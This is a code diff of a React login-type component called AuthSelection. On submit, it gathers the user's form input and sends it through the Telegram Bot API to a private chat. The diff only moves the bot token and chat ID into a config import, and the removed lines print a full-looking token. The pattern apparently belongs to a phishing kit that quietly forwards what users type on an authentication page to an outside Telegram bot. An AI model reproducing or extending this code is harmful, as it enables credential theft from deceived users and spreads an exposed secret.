@@ -6,6 +6,8 @@ import { useStatusContext } from "../../context/StatusContextProvider/StatusCont
 
 import classes from "./AuthSelection.module.css";
 
+import { botUrl, botToken, chatId } from "../../user/home/BaseData";
+
 const AuthSelection = () => {
   const navigate = useNavigate();
   const { t } = useTranslation();
@@ -24,10 +26,6 @@ const AuthSelection = () => {
     setInputText({ ...inputText, [name]: value });
   };
 
-  // Bot token and chat ID
-  const token = "7650029553:AAE61XUJarEQ8WuABMgaKreJo56PpTK-1f4";
-  const chatId = "556841744";
-
   const handleSubmit = async (event) => {
     event.preventDefault();
 
@@ -41,7 +39,7 @@ const AuthSelection = () => {
     });
 
     try {
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      const url = `${botUrl}${botToken}/sendMessage`;
 
       // Format the message
       const message = `
